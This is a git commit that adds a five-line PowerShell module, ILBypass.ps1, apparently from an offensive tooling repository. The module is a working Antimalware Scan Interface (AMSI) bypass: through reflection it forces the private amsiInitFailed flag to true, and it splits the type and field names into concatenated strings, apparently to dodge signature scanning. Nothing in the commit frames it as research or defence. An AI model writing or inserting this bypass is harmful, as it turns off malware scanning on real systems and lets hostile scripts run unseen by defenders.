1884f03a6fbb86a10bc29d532d810a82077b2c6c
t3hbb <dispacct@hotmail.com>
2020-02-10 12:39:02 +0000

    Add files via upload

---
+++ modules/ILBypass.ps1
@@ -0,0 +1,5 @@
+    # ALL CREDIT TO @MATTEFESTATION FOR THE INITIAL TWEET
+    
+    $Ref=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils');
+    $Ref.GetField('amsiIn'+'itFailed','NonPublic,Static').SetValue($null,$true);
+
